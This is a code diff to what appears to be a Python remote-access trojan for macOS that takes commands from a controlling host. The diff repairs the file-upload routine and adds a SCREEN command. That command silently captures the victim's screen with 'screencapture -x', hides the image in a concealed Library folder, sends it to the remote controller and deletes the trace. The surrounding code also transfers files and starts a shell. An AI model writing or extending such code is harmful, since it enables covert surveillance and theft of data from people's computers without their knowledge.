@@ -19,6 +19,7 @@ def start_shell(port):
 
 def take_file(path,size):
     try:
+        size = int(size)
         file = open(path,"wb")
         client.sendall("OK".encode())
         acc = 0
@@ -26,7 +27,7 @@ def take_file(path,size):
         acc += len(data)
         while data:
             file.write(data)
-            if acc <= size:
+            if acc >= size:
                 break
             data = client.recv(1024)
             acc += len(data)
@@ -49,6 +50,24 @@ def give_file(path):
         client.sendall("FAILED".encode())       
 
 
+def send_screen():
+    try:
+        home = os.path.expanduser("~")
+        dest = os.path.join(home,"Library",".system","a.jpg")
+        os.system("screencapture -x " + dest)
+        file_size = str(os.stat(dest).st_size)
+        client.sendall(file_size.encode())
+        _ = client.recv(1024)
+        file = open(dest,"rb")
+        data = file.read(1024) 
+        while data:
+            client.sendall(data)
+            data = file.read(1024)
+        file.close()
+        os.system("rm "+dest)
+    except:
+        client.sendall("FAILED".encode()) 
+
 while True:
     global client
     try:
@@ -64,6 +83,8 @@ while True:
                 give_file(cmd[1])
             elif cmd[0] == "TAKE":
                 take_file(cmd[1],cmd[2])
+            elif cmd[0] == "SCREEN":
+                send_screen()
             elif cmd[0] == "PING":
                 client.sendall("ACK".encode())
             data = client.recv(1024)
